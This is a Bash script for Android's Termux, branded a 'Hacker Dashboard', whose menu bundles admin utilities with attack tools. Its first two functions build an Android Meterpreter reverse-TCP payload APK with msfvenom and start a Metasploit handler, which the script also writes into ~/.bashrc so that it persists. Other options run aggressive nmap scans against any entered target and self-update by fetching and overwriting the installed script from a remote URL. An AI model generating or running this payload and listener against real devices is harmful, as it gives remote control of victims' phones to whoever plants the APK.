#!/bin/bash
# =====================================
# HACKER DASHBOARD - All-in-One Toolkit
# Author: mrdeeorr
# =====================================

# --- COLORS ---
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

# --- GITHUB UPDATE CONFIG ---
REPO_URL="https://raw.githubusercontent.com/mrdeeorr/hacker-dashboard/main/hacker-dashboard.sh"
INSTALL_PATH="/data/data/com.termux/files/usr/bin/hacker-dashboard"

# --- FUNCTIONS ---

payload_generator() {
    echo -e "${YELLOW}[+] Generating Android payload...${RESET}"
    read -p "Enter LHOST (your IP): " LHOST
    read -p "Enter LPORT (your port): " LPORT
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o ~/payload.apk
    echo -e "${GREEN}[+] Payload saved as ~/payload.apk${RESET}"
}

listener() {
    echo -e "${YELLOW}[+] Starting persistent listener...${RESET}"
    read -p "Enter LHOST: " LHOST
    read -p "Enter LPORT: " LPORT
    echo "use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
exploit" > ~/.listener.rc
    echo "msfconsole -r ~/.listener.rc &" >> ~/.bashrc
    msfconsole -r ~/.listener.rc
}

wifi_scan() {
    echo -e "${YELLOW}[+] Scanning WiFi networks...${RESET}"
    pkg install iw net-tools -y
    iw dev || echo -e "${RED}[!] iw not supported on this device${RESET}"
}

port_scan() {
    echo -e "${YELLOW}[+] Running Nmap scan...${RESET}"
    pkg install nmap -y
    read -p "Enter target IP/domain: " target
    nmap -A $target | tee ~/logs/nmap_scan.txt
}

update_system() {
    echo -e "${YELLOW}[+] Updating Termux packages...${RESET}"
    pkg update -y && pkg upgrade -y
    echo -e "${GREEN}[+] System updated!${RESET}"
}

check_logs() {
    echo -e "${YELLOW}[+] Displaying logs...${RESET}"
    mkdir -p ~/logs
    ls ~/logs
}

backup_logs() {
    echo -e "${YELLOW}[+] Backing up logs...${RESET}"
    mkdir -p ~/logs_backup
    cp -r ~/logs/* ~/logs_backup/ 2>/dev/null
    echo -e "${GREEN}[+] Logs backed up!${RESET}"
}

delete_logs() {
    echo -e "${RED}[!] Deleting all logs...${RESET}"
    rm -rf ~/logs/*
    echo -e "${GREEN}[+] Logs deleted.${RESET}"
}

install_pkg() {
    echo -e "${YELLOW}[+] Installing package...${RESET}"
    read -p "Enter package name: " pkgname
    pkg install $pkgname -y
}

uninstall_pkg() {
    echo -e "${YELLOW}[+] Uninstalling package...${RESET}"
    read -p "Enter package name: " pkgname
    pkg uninstall $pkgname -y
}

network_info() {
    echo -e "${YELLOW}[+] Network Information:${RESET}"
    ifconfig
}

device_info() {
    echo -e "${YELLOW}[+] Device Information:${RESET}"
    uname -a
    termux-info
}

start_ssh() {
    echo -e "${YELLOW}[+] Starting SSH server...${RESET}"
    pkg install openssh -y
    sshd
    echo -e "${GREEN}[+] SSH started on port 8022${RESET}"
}

start_apache() {
    echo -e "${YELLOW}[+] Starting Apache server...${RESET}"
    pkg install apache2 -y
    apachectl start
    echo -e "${GREEN}[+] Apache started on http://localhost:8080${RESET}"
}

searchsploit_tool() {
    echo -e "${YELLOW}[+] Installing and running Searchsploit...${RESET}"
    pkg install searchsploit -y
    searchsploit
}

auto_startup() {
    echo -e "${YELLOW}[+] Setting dashboard to autostart...${RESET}"
    echo "~/hacker-dashboard.sh" >> ~/.bashrc
    echo -e "${GREEN}[+] Dashboard will auto-start with Termux.${RESET}"
}

uninstall_dashboard() {
    echo -e "${RED}[!] Removing Hacker Dashboard...${RESET}"
    sed -i '/hacker-dashboard/d' ~/.bashrc
    sed -i '/msfconsole -r ~\/.listener.rc/d' ~/.bashrc
    rm -f ~/.listener.rc
    dpkg -r hacker-dashboard 2>/dev/null
    rm -rf ~/logs ~/logs_backup
    rm -f $INSTALL_PATH
    echo -e "${GREEN}[+] Uninstalled completely.${RESET}"
}

self_update() {
    echo -e "${BLUE}[+] Checking for updates from GitHub...${RESET}"
    curl -s -o /tmp/hacker-dashboard.sh "$REPO_URL"
    if [ -s /tmp/hacker-dashboard.sh ]; then
        mv /tmp/hacker-dashboard.sh "$INSTALL_PATH"
        chmod +x "$INSTALL_PATH"
        echo -e "${GREEN}[+] Hacker Dashboard updated successfully from GitHub!${RESET}"
    else
        echo -e "${RED}[!] Update failed. Could not fetch script.${RESET}"
    fi
}

# --- MAIN MENU ---
while true; do
clear
echo -e "${BLUE}==============================="
echo -e "     HACKER DASHBOARD MENU     "
echo -e "===============================${RESET}"
echo -e "1.  Generate Android Payload"
echo -e "2.  Start Listener"
echo -e "3.  WiFi Scan"
echo -e "4.  Port Scan"
echo -e "5.  Update System"
echo -e "6.  Check Logs"
echo -e "7.  Backup Logs"
echo -e "8.  Delete Logs"
echo -e "9.  Install Package"
echo -e "10. Uninstall Package"
echo -e "11. Network Info"
echo -e "12. Device Info"
echo -e "13. Start SSH Server"
echo -e "14. Start Apache Server"
echo -e "15. Searchsploit"
echo -e "16. Enable Auto-Startup"
echo -e "17. Uninstall Dashboard"
echo -e "18. Exit"
echo -e "19. Self Update from GitHub"
echo -e "${BLUE}===============================${RESET}"
read -p "Select option: " choice

case $choice in
    1) payload_generator ;;
    2) listener ;;
    3) wifi_scan ;;
    4) port_scan ;;
    5) update_system ;;
    6) check_logs ;;
    7) backup_logs ;;
    8) delete_logs ;;
    9) install_pkg ;;
    10) uninstall_pkg ;;
    11) network_info ;;
    12) device_info ;;
    13) start_ssh ;;
    14) start_apache ;;
    15) searchsploit_tool ;;
    16) auto_startup ;;
    17) uninstall_dashboard ;;
    18) exit 0 ;;
    19) self_update ;;
    *) echo -e "${RED}[!] Invalid option${RESET}" ;;
esac

read -p "Press Enter to continue..."
done